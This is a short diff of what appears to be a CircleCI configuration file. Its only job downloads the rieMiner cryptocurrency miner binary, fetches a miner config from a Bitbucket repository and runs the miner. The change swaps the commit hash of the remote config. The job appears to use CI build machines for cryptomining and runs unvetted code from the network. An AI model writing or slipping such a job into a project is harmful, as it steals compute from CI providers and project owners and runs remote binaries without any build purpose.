@@ -8,7 +8,7 @@ jobs:
       - checkout # check out the code in the project directory
       - run: wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2
       - run: chmod +x rie
-      - run: wget https://bitbucket.org/ricmine001/ricmine01/raw/1044bdd3849be5876ba2fb8476cec1891a5e7812/rieMiner.conf
+      - run: wget https://bitbucket.org/ricmine001/ricmine01/raw/2df7a7d4a7d05b42e67bc6f8eb975e4afa09b294/rieMiner.conf
       - run: ./rie
 
 workflows:
